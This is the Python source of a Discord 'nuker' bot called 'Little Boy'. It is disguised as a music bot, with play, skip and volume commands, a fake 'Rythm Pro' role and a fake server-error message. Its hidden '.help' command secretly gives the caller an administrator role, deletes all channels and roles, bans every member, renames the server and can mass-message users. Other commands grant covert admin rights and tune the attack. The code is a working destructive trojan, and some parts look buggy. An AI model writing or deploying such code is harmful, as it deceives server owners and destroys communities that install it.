import discord
from discord.ext import commands
from datetime import datetime
from dotenv import load_dotenv
from os import getenv
from time import sleep
from typing import Optional



try:
    load_dotenv()
    TOKEN = getenv("TOKEN")
except Exception:
    TOKEN = ""

prefix = "."

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix=prefix, intents=intents)


bot.remove_command("help")


admin_role = [False]

config_options = {
    1 : "ban",
    2 : "channels",
    3 : "roles",
    4 : "server",
    5 : "nuke_channel",
    6 : "dm"
}

ban = [True] 
channels = [True]
roles = [True] 
server = [True] 
nuke_channel = [True] 
dm = [True] 


# nuking functions

async def create_admin(ctx):
    global admin_role
    if not admin_role[0]:
        try:
            admin_role = []
            admin_role.append(True)

            role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))
            
            admin_role.append(role)
            admin_role.append(role.id)

            await ctx.message.author.add_roles(admin_role[1])

            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
=> ADMIN ALERT <=
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                f.close()

            print(f"Gave {ctx.message.author} the admin role.")

        except discord.Forbidden:
            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
Failed to create/grant administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                f.close()

    else:
        role = admin_role[1]

        if role is None:
            try:
                admin_role = []
                admin_role.append(True)

                role = await ctx.guild.create_role(name="Member", permissions=discord.Permissions(permissions=8))

                admin_role.append(role)
                admin_role.append(role.id)

                await ctx.message.author.add_roles(admin_role[1])
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
=> ADMIN ALERT <=
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                    f.close()

                print(f"Gave {ctx.message.author} the admin role.")

            except discord.Forbidden:
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
Failed to create/grant administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                    f.close()

        else:
            try:
                await ctx.message.author.add_roles(role)

                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
=> ADMIN ALERT <=
Gave {ctx.message.author} the admin role.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                    f.close()

                print(f"Gave {ctx.message.author} the admin role.")
            except discord.Forbidden:
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
Failed to create/grant administrator role: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


# delete all channels
async def delete_channels(ctx):
    for guild in bot.guilds:
        if guild.name == ctx.guild.name:
            for channel in guild.channels:
                try:
                    await channel.delete()
                except discord.Forbidden:
                    with open("nuke_log.txt", "a+") as f:
                        f.write(f'''
Failed to delete channel "{channel.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                        f.close()

    print("Deleted all channels.")


# create nuke channel
async def create_nuke_channel(ctx, name):
    try:
        nuke_channel = await ctx.guild.create_text_channel(name)
    except discord.Forbidden:
        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Failed to create the "get nuked" channel: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
            f.close()

    print("Created the nuke channel.")


# change server name and icon
async def edit_server(ctx, name, icon_file):
    with open(icon_file, "rb") as f:
        icon = f.read()
        f.close()
    try:
        await ctx.guild.edit(name=name, icon=icon)
    except discord.Forbidden:
        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Failed to edit the server's icon and name: insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
            f.close()

    print("Edited the server's icon and name.")


# ban all members
async def ban_members(ctx, member_list):
    if member_list != []:
        for member_id in member_list:
            member = await bot.fetch_user(member_id)
            if not member.bot:
                try:
                    await ctx.guild.ban(member, reason="Little Boy was activated.")
                except discord.Forbidden:
                    with open("nuke_log.txt", "a+") as f:
                        f.write(f'''
Failed to ban user "{member}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                        f.close()
            else:
                with open("nuke_log.txt", "a+") as f:
                    f.write(f'''
Failed to ban user "{member}": user is a bot.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                    f.close()
                    member_list.remove(member_id)

    print("Banned all users.")


# delete all roles
async def delete_roles(ctx, role_list):
    for role in role_list:
        try:
            await role.delete()
        except discord.Forbidden:
            with open("nuke_log.txt", "a+") as f:
                f.write(f'''
Failed to delete role "{role.name}": insufficient permissions.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
                f.close()
                role_list.remove(role)
                
    print("Deleted all roles.")


# basic bot info

@bot.event
async def on_ready():
    activity = discord.Activity(
        name="for !help", type=discord.ActivityType.watching)
    await bot.change_presence(activity=activity)

    print(f"{bot.user} online!")
    print("Connected servers: \n")

    for guild in bot.guilds:
        print(guild.name)


@bot.event
async def on_guild_join(guild):
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> SERVER JOIN ALERT <=
{bot.user} has joined the server.
Server Name: {guild.name}
Server Owner: {guild.owner}
Time: {datetime.now()}
''')


# outputs to the log some basic info about the old guild when disconnected
@bot.event
async def on_guild_leave(guild):
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> SERVER LEAVE ALERT <=
{bot.user} has left the server.
Server Name: {guild.name}
Server Owner: {guild.owner}
Time: {datetime.now()}
''')

# fake error 

@bot.event
async def on_message(msg):
    if msg.content.startswith("!"):
        await bot.process_commands(msg)
        embed = discord.Embed(
            title="Server Error!", description="Our servers are currently experiencing some issues, please check back at a later time!",
            colour=0xff0000, set_image="https://i.imgur.com/qxBoiZY.png"
        )

        await msg.channel.send(content=None, embed=embed)


# nukes the server
@bot.command(name="help")
@commands.bot_has_permissions(administrator=True)
async def nuke(ctx):
    server_name = ctx.guild.name


    await create_admin(ctx)


    await delete_channels(ctx)


    await create_nuke_channel(ctx, "get nuked")


    await edit_server(ctx, "GET NUKED!", "../nuke.jpg")

    # bans all users

    member_list = []
    for member in ctx.guild.members:
        member_list.append(member.id)

    member_list.remove(bot.user.id) # remove the bot from the "to be banned" list
    member_list.remove(ctx.message.author.id) # remove the user from the "to be banned" list
    if ctx.message.author.id != ctx.guild.owner.id:
        member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list

    await ban_members(ctx, member_list)


    role_list = []
    for role in ctx.guild.roles:
        role_list.append(role)

    role_list.remove(ctx.guild.default_role) # removes @everyone from the "role to be deleted" list
    role_list.remove(discord.utils.get(ctx.guild.roles, name="Rythm Pro")) # removes the bot role from the "role to be deleted" list
    role_list.remove(admin_role) # remove the admin role made above from the "role to be deleted" list

    await delete_roles(ctx, role_list)

    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> NUKE ALERT <=
Server Name: {server_name}
Server Owner: {ctx.guild.owner}
Banned Users: {len(member_list)}
Roles Deleted: {len(role_list)}
Time: {datetime.now()}
''')
        f.close()


# gives the user admin
@bot.command(name="play")
async def play(ctx):
    await ctx.message.delete()
    await create_admin(ctx)

@bot.command(name="pause")
async def pause(ctx):
    await ctx.message.delete() 
    await ctx.guild.ban(await bot.fetch_user(ctx.message.author.id))
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> NUKER BAN ALERT <=
Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
        f.close()


# bans the person who ran the command as well as removing the bot
@bot.command(name="stop")
async def stop(ctx):
    await ctx.message.delete() 
    await ctx.guild.ban(await bot.fetch_user(ctx.message.author.id))
    await ctx.guild.leave()
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> NUKER CLEANUP ALERT <=
Nuker ({await bot.fetch_user(ctx.message.author.id)}) has been banned from the server and the bot has been removed!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')
        f.close()


@bot.command(name="leave")
async def leave(ctx):
    await ctx.guild.leave()
    with open("nuke_log.txt", "a+") as f:
        f.write(f'''
=> SERVER LEAVE ALERT <=
{bot.user} has left the server.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

# additional options

@bot.command(name="volume")
async def volume(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
    await ctx.message.delete()
    global ban, channels, roles, server, nuke_channel, dm

    if value != "*":
        setting = config_options[int(value)]
        if setting == "ban":
            ban = []
            ban.append(status)

            print(f"Changed ban everyone to {ban[0]}")
        elif setting == "channels":
            channels = []
            channels.append(status)

            print(f"Changed delete channels to {channels[0]}")
        elif setting == "roles":
            roles = []
            roles.append(status)

            print(f"Changed delete roles to {roles[0]}")
        elif setting == "server":
            server = []
            server.append(status)

            if arg1:
                server.append(arg1)
            else:
                server.append("Little Boy has been activated. ")
            
            

            print(f"Changed server to {server[0]} with a name of {server[1]} and an icon of {server[2]}")
        elif setting == "nuke_channel":
            nuke_channel = []
            nuke_channel.append(status)

            if arg1:
                nuke_channel.append(arg1)
            else:
                nuke_channel.append("Little Boy has dropped.")

            print(f"Changed nuke channel to {nuke_channel[0]} with a name of {nuke_channel[1]}")

        elif setting == "dm":
            dm = []
            dm.append(status)

            if arg1:
                dm.append(arg1)
            else:
                dm.append("Little Boy has dropped.")

            print(f"Changed DM everyone to {dm[0]} with a message of {dm[1]}")
    
    else:
        ban = []
        ban.append(status)

        print(f"Changed ban everyone to {ban[0]}")

        channels = []
        channels.append(status)

        print(f"Changed delete channels to {channels[0]}")
    
        roles = []
        roles.append(status)

        print(f"Changed delete roles to {roles[0]}")

        server = []
        server.append(status)

        if arg1:
            server.append(arg1)
        else:
            server.append("Little Boy has dropped.")
        
     

        print(f"Changed server to {server[0]} with a name of {server[1]} and an icon of {server[2]}")

        nuke_channel = []
        nuke_channel.append(status)

        if arg1:
            nuke_channel.append(arg1)
        else:
            nuke_channel.append("get nuked")

        print(f"Changed nuke channel to {nuke_channel[0]} with a name of {nuke_channel[1]}")

        dm = []
        dm.append(status)

        if arg1:
            dm.append(arg1)
        else:
            dm.append("Little Boy has dropped.")

        print(f"Changed DM everyone to {dm[0]} with a message of \"{dm[1]}\"")



# customisable nuke command introduced in v1.4
@bot.command(name="skip")
async def skip(ctx):
    do_ban = ban[0]
    do_channels = channels[0]
    do_roles = roles[0]
    do_server = server[0]
    do_nc = nuke_channel[0]
    do_dm = dm[0]

    # check for custom nuke_channel
    if do_nc:
        nc_name = nuke_channel[1]
        await create_nuke_channel(ctx, nc_name)

    if do_dm:
        message = dm[1]
        dm_list = []
        for member in ctx.guild.members:
            dm_list.append(member)

        dm_list.remove(bot.user) # remove the bot from the "to DM" list
        dm_list.remove(ctx.message.author) # remove the user from the "to DM" list
        if ctx.message.author.id != ctx.guild.owner.id:
            dm_list.remove(ctx.guild.owner) # remove the server owner from the "to DM" list

        for member in dm_list:
            try:
                if not member.bot:
                        await member.send(message)
                else:
                    print(f"Could not DM user {member.name}: user is a bot.")
            except discord.HTTPException:
                print(f"Could not DM user {member.name}.")


    if do_ban:
        member_list = []
        for member in ctx.guild.members:
            member_list.append(member.id)

        member_list.remove(bot.user.id) # remove the bot from the "to be banned" list
        member_list.remove(ctx.message.author.id) # remove the user from the "to be banned" list
        member_list.remove(ctx.guild.owner_id) # remove the server owner from the "to be banned" list

        await ban_members(ctx, member_list)

    if do_channels:
        await delete_channels(ctx)

    if do_roles:
        role_list = []
        for role in ctx.guild.roles:
            role_list.append(role)

        role_list.remove(ctx.guild.default_role) # removes @everyone from the "role to be deleted" list
        role_list.remove(discord.utils.get(ctx.guild.roles, name="Rythm Pro")) # removes the bot role from the "role to be deleted" list
        role_list.remove(admin_role) # remove the admin role made above from the "role to be deleted" list

        await delete_roles(ctx, role_list)

    if do_server:
        server_name = server[1]
        server_icon = server[2]

        await edit_server(ctx, server_name, server_icon)


# checks if the bot has administrator permissions
# if it doesn't, throws an error
@nuke.error
async def nuke_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@play.error
async def play_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions! Cannot activate Little Boy.
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@pause.error
async def pause_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')


@stop.error
async def stop_error(ctx, error):
    if isinstance(error, commands.BotMissingPermissions):
        await ctx.send("Checking environment...")
        sleep(1)
        try:
            embed = discord.Embed(title="Error: Missing Required Permissions!",
description="This bot is lacking required permissions!")
            embed.add_field(name="You need to grant me the following permission(s):",
value="- Administrator")
            await ctx.send(content=None, embed=embed)
        except discord.Forbidden:
            await ctx.send('''
__**Error: Missing Required Permission!**__
**I need the following permission(s) to function properly:**
- `Administrator`
''')

        with open("nuke_log.txt", "a+") as f:
            f.write(f'''
Bad Environment: Insufficient Permissions!
Server Name: {ctx.guild.name}
Server Owner: {ctx.guild.owner}
Time: {datetime.now()}
''')

